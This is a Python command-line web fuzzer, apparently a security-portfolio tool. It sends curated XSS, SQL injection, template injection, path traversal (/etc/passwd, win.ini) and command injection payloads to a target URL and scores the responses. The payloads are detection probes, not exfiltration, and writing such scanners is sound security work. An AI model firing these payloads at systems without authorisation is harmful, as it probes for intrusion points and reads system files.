"""
TOOL 5 — Input Fuzzer (Web Applications)
========================================
A production-quality CLI tool for safe, low-noise input fuzzing of web
applications. Sends curated payload sets for XSS, SQL Injection, SSTI,
path traversal, and command injection — then analyzes responses for
reflection, error signatures, status anomalies, and timing differences.

What fuzzing is (interview-ready):
  Fuzzing is systematic input variation designed to trigger unexpected
  behavior. For web apps it helps identify unsanitized input handling,
  error leakage, or reflection of user-controlled data in responses.

Why reflection ≠ vulnerability:
  Reflection is a signal, not proof. If output is contextually encoded
  (e.g., HTML-entity-encoded inside an attribute), XSS may not be
  exploitable. Similarly, a SQL error string may come from a sanitized
  layer that catches and logs the error safely.

False-positive scenarios:
  - Search UIs that intentionally echo the query term.
  - WAFs that inject the blocked payload into a "request denied" page.
  - Debug/error pages that display the raw request for developers.

Usage examples:
  python input_fuzzer.py --url https://example.com/search --param q --payload-type xss
  python input_fuzzer.py --url https://example.com/login --method POST --param username --payload-type sqli
  python input_fuzzer.py --url https://example.com/api --param q --payload-type all
  python input_fuzzer.py --url https://example.com/search --param q --payload-type xss --param q2 --payload-file custom.txt
  python input_fuzzer.py --url https://example.com/search --param q --payload-type xss --output-json report.json

Sample output:
------------------------------------------------
=== Input Fuzzer ===
  Target  : https://example.com/search
  Method  : GET
  Params  : q
  Category: xss
  Baseline: 200 (1523 bytes, 45ms)

[HIGH] XSS reflection in HTML attribute: "'><img src=x onerror=alert(1)>  →  param "q" (200, 1580 bytes)
[MED]  XSS reflection in body: <script>alert(1)</script>  →  param "q" (200, 1567 bytes)
[LOW]  WAF / blocking detected: <svg/onload=alert(1)>  →  param "q" (403, 0 bytes)
[MED]  SQL error signature: ' OR '1'='1  →  param "q" (500, "You have an error in your SQL syntax")
[LOW]  Response time anomaly: ' OR SLEEP(2)--  →  param "q" (200, 2340ms vs baseline 45ms)

Summary: 3 potential issues, 1 WAF block, 1 timing anomaly

Limitations:
  - This tool does NOT exploit or confirm vulnerabilities.
  - Time-based detection depends on network jitter; high-latency targets cause FPs.
  - Custom payloads should be non-destructive.
"""

from __future__ import annotations

import argparse
import html
import json
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------
@dataclass
class Finding:
    """A single fuzzing observation with severity and context."""
    level: str          # LOW / MED / HIGH
    category: str       # xss / sqli / ssti / path / cmdi / timing / waf
    message: str
    param: str
    payload: str
    status_code: int
    response_ms: int


# ---------------------------------------------------------------------------
# Payload sets — curated, non-destructive, interview-explainable
# ---------------------------------------------------------------------------
# Why these specific payloads:
# - XSS: cover script tags, event handlers, SVG, and polyglot patterns.
# - SQLi: cover string-based, numeric, UNION, error-based, and time-based.
# - SSTI: Jinja2/Twig/Freemarker expressions that evaluate to known values.
# - Path traversal: relative paths that target common OS files.
# - Command injection: backtick/pipe patterns that delay or echo.

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    "\"'><img src=x onerror=alert(1)>",
    '<svg/onload=alert(1)>',
    "javascript:alert(1)",
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    "'-alert(1)-'",
    '<img src=x onerror=prompt(1)>',
    '<body onload=alert(1)>',
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' UNION SELECT NULL--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "' OR SLEEP(2)--",            # time-based blind hint
    "1; WAITFOR DELAY '0:0:2'--", # MSSQL time-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
]

SSTI_PAYLOADS = [
    "{{7*7}}",           # Jinja2 / Twig → should render "49"
    "${7*7}",            # Freemarker
    "#{7*7}",            # Ruby ERB / Java EL
    "<%= 7*7 %>",        # ERB
    "{{constructor.constructor('return 1')()}}",  # Prototype pollution hint
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

CMDI_PAYLOADS = [
    "; echo vulnerable",
    "| echo vulnerable",
    "`echo vulnerable`",
    "$(echo vulnerable)",
]

PAYLOAD_MAP: Dict[str, List[str]] = {
    "xss": XSS_PAYLOADS,
    "sqli": SQLI_PAYLOADS,
    "ssti": SSTI_PAYLOADS,
    "path": PATH_TRAVERSAL_PAYLOADS,
    "cmdi": CMDI_PAYLOADS,
}


# ---------------------------------------------------------------------------
# SQL error signatures — database-specific strings that indicate unhandled
# SQL errors. These are strong signals (not proof) of injection points.
# ---------------------------------------------------------------------------
_SQL_ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"unclosed quotation mark", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"ORA-\d{5}", re.I),                     # Oracle
    re.compile(r"PG::SyntaxError", re.I),                # PostgreSQL
    re.compile(r"microsoft.*odbc.*driver", re.I),        # MSSQL ODBC
    re.compile(r"sqlite3\.OperationalError", re.I),      # SQLite
    re.compile(r"sql.*syntax.*error", re.I),             # generic
]

# Path traversal success indicators
_PATH_SIGNATURES = [
    re.compile(r"root:.*:0:0:", re.I),                   # /etc/passwd
    re.compile(r"\[extensions\]", re.I),                  # win.ini
]

# SSTI success: the expression 7*7 evaluated to 49
_SSTI_MARKER = "49"

# Command injection success
_CMDI_MARKER = "vulnerable"


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------
_SSL_CTX = ssl.create_default_context()


def _send_request(
    url: str,
    method: str,
    params: Dict[str, str],
    user_agent: str,
    timeout: int,
) -> Tuple[int, str, int]:
    """Send GET or POST and return (status, body, elapsed_ms).

    Why we measure time: response-time anomalies are a signal for
    time-based blind injection (e.g., SLEEP / WAITFOR DELAY).
    """
    handler = urllib.request.HTTPSHandler(context=_SSL_CTX)
    opener = urllib.request.build_opener(handler)

    if method == "GET":
        query = urllib.parse.urlencode(params)
        sep = "&" if "?" in url else "?"
        full_url = url + sep + query
        req = urllib.request.Request(full_url, method="GET")
    else:
        data = urllib.parse.urlencode(params).encode("utf-8")
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")

    req.add_header("User-Agent", user_agent)

    start = time.monotonic()
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(512_000).decode("utf-8", errors="ignore")
            elapsed = int((time.monotonic() - start) * 1000)
            return resp.status, body, elapsed
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore") if e.fp else ""
        elapsed = int((time.monotonic() - start) * 1000)
        return e.code, body, elapsed
    except Exception:
        elapsed = int((time.monotonic() - start) * 1000)
        return 0, "", elapsed


# ---------------------------------------------------------------------------
# Baseline capture
# ---------------------------------------------------------------------------
def capture_baseline(
    url: str, method: str, param: str, user_agent: str, timeout: int
) -> Tuple[int, int, int]:
    """Send a benign request to establish normal behavior.

    Returns (status, body_length, elapsed_ms).
    Why: comparing fuzzed responses against a baseline lets us detect
    anomalies (status changes, size deltas, timing spikes).
    """
    status, body, elapsed = _send_request(
        url, method, {param: "baseline_test_value"}, user_agent, timeout
    )
    return status, len(body), elapsed


# ---------------------------------------------------------------------------
# Fuzzing + analysis
# ---------------------------------------------------------------------------
def fuzz_param(
    url: str,
    method: str,
    param: str,
    payloads: List[str],
    category: str,
    user_agent: str,
    timeout: int,
    baseline_status: int,
    baseline_ms: int,
) -> List[Finding]:
    """Fuzz a single parameter and analyze responses.

    Detection signals:
    1. Reflection — payload appears in response body (XSS, SSTI).
    2. Error signature — database error strings (SQLi).
    3. Content match — known file contents (path traversal) or eval result (SSTI).
    4. Status anomaly — 500 where baseline was 200, or 403 (WAF block).
    5. Timing anomaly — response significantly slower than baseline (blind SQLi).
    """
    findings: List[Finding] = []

    for payload in payloads:
        status, body, elapsed = _send_request(url, method, {param: payload}, user_agent, timeout)
        if status == 0:
            continue

        body_unescaped = html.unescape(body)

        # --- WAF / blocking detection ---
        if status == 403 and baseline_status != 403:
            findings.append(Finding(
                "LOW", "waf",
                f"WAF / blocking detected: {payload}",
                param, payload, status, elapsed,
            ))
            continue

        # --- XSS reflection with context ---
        if category == "xss" and (payload in body or payload in body_unescaped):
            # Determine reflection context for severity
            sev = "MED"
            ctx = "body"
            if re.search(
                rf'(?:value|href|src|action)\s*=\s*["\'][^"\']*{re.escape(payload)}',
                body, re.I,
            ):
                sev, ctx = "HIGH", "HTML attribute"
            elif re.search(
                rf'<script[^>]*>.*?{re.escape(payload)}.*?</script>',
                body, re.I | re.S,
            ):
                sev, ctx = "HIGH", "JavaScript block"

            findings.append(Finding(
                sev, "xss",
                f"XSS reflection in {ctx}: {payload}",
                param, payload, status, elapsed,
            ))

        # --- SQL error signatures ---
        if category == "sqli":
            for pattern in _SQL_ERROR_PATTERNS:
                m = pattern.search(body)
                if m:
                    findings.append(Finding(
                        "MED", "sqli",
                        f'SQL error signature: {payload} → "{m.group()}"',
                        param, payload, status, elapsed,
                    ))
                    break

            # Status anomaly (500 on SQLi payload where baseline was 200)
            if status >= 500 and baseline_status < 500:
                findings.append(Finding(
                    "MED", "sqli",
                    f"Server error on SQLi payload: {payload} → {status}",
                    param, payload, status, elapsed,
                ))

        # --- SSTI evaluation ---
        if category == "ssti" and _SSTI_MARKER in body and _SSTI_MARKER not in payload:
            # 49 in body but not in payload means expression was evaluated
            findings.append(Finding(
                "HIGH", "ssti",
                f"SSTI expression evaluated: {payload} → response contains '{_SSTI_MARKER}'",
                param, payload, status, elapsed,
            ))

        # --- Path traversal ---
        if category == "path":
            for sig in _PATH_SIGNATURES:
                if sig.search(body):
                    findings.append(Finding(
                        "HIGH", "path",
                        f"Path traversal success indicator: {payload}",
                        param, payload, status, elapsed,
                    ))
                    break

        # --- Command injection ---
        if category == "cmdi" and _CMDI_MARKER in body:
            findings.append(Finding(
                "HIGH", "cmdi",
                f"Command injection echo detected: {payload}",
                param, payload, status, elapsed,
            ))

        # --- Timing anomaly (blind injection hint) ---
        # Why 1500ms threshold: accounts for normal network jitter while
        # catching SLEEP(2)/WAITFOR DELAY injections.
        if elapsed > baseline_ms + 1500:
            findings.append(Finding(
                "LOW", "timing",
                f"Response time anomaly: {payload} → {elapsed}ms (baseline {baseline_ms}ms)",
                param, payload, status, elapsed,
            ))

    return findings


# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------
def _print_findings(findings: List[Finding]) -> None:
    severity_order = {"HIGH": 0, "MED": 1, "LOW": 2}
    findings.sort(key=lambda f: severity_order.get(f.level, 9))

    for f in findings:
        print(f"  [{f.level:4s}] {f.message}  →  param \"{f.param}\" ({f.status_code}, {f.response_ms}ms)")


def _findings_to_json(findings: List[Finding]) -> List[dict]:
    return [asdict(f) for f in findings]


# ---------------------------------------------------------------------------
# CLI / main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Safe input fuzzer — reflection, error, and timing analysis (no exploitation)",
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")
    parser.add_argument("--param", required=True, action="append", dest="params",
                        help="Parameter(s) to fuzz (repeat for multiple)")
    parser.add_argument("--payload-type", choices=["xss", "sqli", "ssti", "path", "cmdi", "all"],
                        required=True, help="Payload category")
    parser.add_argument("--payload-file", help="File with custom payloads (one per line)")
    parser.add_argument("--user-agent", default="InputFuzzer/1.0", help="Custom User-Agent")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--output-json", help="Write JSON report to file")

    args = parser.parse_args()

    # Build payload list
    if args.payload_type == "all":
        categories = list(PAYLOAD_MAP.keys())
    else:
        categories = [args.payload_type]

    # Load custom payloads if provided
    custom_payloads: List[str] = []
    if args.payload_file:
        with open(args.payload_file, "r", encoding="utf-8") as f:
            custom_payloads = [line.strip() for line in f if line.strip()]

    all_findings: List[Finding] = []

    for param in args.params:
        # Capture baseline for comparison
        bl_status, bl_size, bl_ms = capture_baseline(
            args.url, args.method, param, args.user_agent, args.timeout
        )

        print("=== Input Fuzzer ===")
        print(f"  Target   : {args.url}")
        print(f"  Method   : {args.method}")
        print(f"  Param    : {param}")
        print(f"  Category : {args.payload_type}")
        print(f"  Baseline : {bl_status} ({bl_size} bytes, {bl_ms}ms)")
        print()

        for cat in categories:
            payloads = PAYLOAD_MAP[cat][:]
            if custom_payloads:
                payloads.extend(custom_payloads)

            findings = fuzz_param(
                args.url, args.method, param, payloads, cat,
                args.user_agent, args.timeout, bl_status, bl_ms,
            )
            all_findings.extend(findings)

    # Print results
    if all_findings:
        print("Findings:")
        _print_findings(all_findings)
    else:
        print("  No issues detected.")

    # Summary
    high = sum(1 for f in all_findings if f.level == "HIGH")
    med = sum(1 for f in all_findings if f.level == "MED")
    low = sum(1 for f in all_findings if f.level == "LOW")
    waf = sum(1 for f in all_findings if f.category == "waf")
    print(f"\n  Summary: {high} high, {med} medium, {low} low ({waf} WAF blocks)")

    print("\n  Notes:")
    print("  - Findings are potential issues, not confirmed exploits.")
    print("  - Timing anomalies depend on network conditions; verify manually.")
    print("  - HIGH findings (SSTI eval, path traversal, cmdi echo) are strong signals.")

    # JSON output
    if args.output_json:
        report = {
            "target": args.url,
            "method": args.method,
            "params": args.params,
            "findings": _findings_to_json(all_findings),
        }
        with open(args.output_json, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        print(f"\n  Report written to {args.output_json}")


if __name__ == "__main__":
    main()
